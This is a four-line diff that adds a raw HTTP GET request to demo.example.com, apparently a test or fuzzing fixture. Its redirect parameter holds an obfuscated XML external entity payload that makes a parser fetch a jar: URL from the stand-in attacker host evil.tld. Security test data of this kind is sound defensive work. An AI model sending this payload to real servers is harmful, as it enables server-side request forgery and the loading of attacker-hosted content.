@@ -1,0 +1,4 @@
+GET /a?redirect=<!/*%00*/DOCTYPE%20r%20[<!ENTITY%20x%20SYSTEM%20"jar:http://evil.tld/x.jar!/x">]><r>%26x;</r> HTTP/1.1
+Host: demo.example.com
+Connection: close
+
